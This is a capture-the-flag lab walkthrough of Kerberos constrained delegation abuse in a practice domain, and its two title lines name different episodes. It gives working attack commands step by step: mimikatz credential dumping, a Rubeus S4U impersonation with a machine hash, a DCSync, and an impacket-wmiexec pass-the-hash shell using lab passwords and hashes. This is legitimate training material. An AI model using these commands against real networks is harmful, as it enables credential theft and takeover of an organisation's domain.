---
date: 2025-04-23
categories: [CTF, ImmersiveLabs]
title: "IML - Kerberos: Ep.10 – Active Directory Certificate Services"
tags: ['impacket', 'kerberos', 'ldap', 'mimikatz', 'privilege escalation', 'rce', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Kerberos Ep.10 – Constrained Delegation - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Kerberos: Ep.12 – Active Directory Certificate Services
IML - Kerberos: Ep.10 – Constrained Delegation


![image1](../resources/24572ad78ded4dd98fdf3c6ad76e3479.png)

- RDP:

```bash
xfreerdp /v:10.102.178.2 /u:s.villanelle /d:krbtown /p:Summ3r2021! +clipboard +drives /drive:root,/home/kali /dynamic-resolution

```
- Enumerating for constrained delegation:
  - Open Powerview_dev.ps1:

```powershell
. .\Powerview_dev.ps1
Get-DomainComputer -TrustedToAuth
```

![image2](../resources/929e32b85b234e2a8dabd20fc9e07801.png)


![image3](../resources/5bec82bd8acc4f948467580078970b92.png)


![image4](../resources/aa1e7bdd94104b41bae886da0de5adf0.png)


![image5](../resources/c1cb618a49bb4af48af5de15fd518b91.png)

- RDP to WKS-02
- Run mimikatz

```powershell
privilege::debug
sekurlsa::logonpasswords

```

![image6](../resources/c848a6fa7cc642dca0f7f15e5d943d62.png)


![image7](../resources/dc5ca5cbdc1b4844a52c7ac6aa02134a.png)

- Impersonate a.belridge, using workstation-02\$ as the target host:

```powershell
.\Rubeus.exe s4u /user:workstation-02$ /rc4:[HASH] /domain:krbtown.local /impersonateuser:a.belridge /msdsspn:"ldap/dc01.krbtown.local" /dc:dc01.krbtown.local /ptt

.\Rubeus.exe s4u /user:workstation-02$ /rc4:6ee2e72810d54399a588b424ac22df1e /domain:krbtown.local /impersonateuser:a.belridge /msdsspn:"ldap/dc01.krbtown.local" /dc:dc01.krbtown.local /ptt

```

![image8](../resources/1fb367d85ec84645869a9f58d631e39c.png)


![image9](../resources/6507e1cfe4f54498893b741d1128dd2e.png)


![image10](../resources/5f0674f9dc0b4c7aab78a87b27787a1e.png)


![image11](../resources/5b32eceaae30422989624bf7549904b9.png)


![image12](../resources/89cbbec614654ca7a6039fcec99f93ca.png)


![image13](../resources/cbed1e41eff34035b87a29e067e09fe5.png)

- Run Mimikatz on an elevated command prompt:

```bash
lsadump::dcsync /user:krbtown\a.belridge

```

![image14](../resources/ad8d9d01313046279b3849a1bbe84b0c.png)

- Use wmiexec to get shell:

```bash
impacket-wmiexec [DOMAIN][USERNAME]@[TARGET] -hashes '[LM-HASH]:[NT-HASH]'

impacket-wmiexec krbtown/a.belridge@10.102.93.148 -hashes 'a76a0f6f801d8430903f7f299c18dfc4:ed882753d4665914577c19b6b85ead51'

```

![image15](../resources/65b197d9a02d4da48061d4fea7a5b6bd.png)
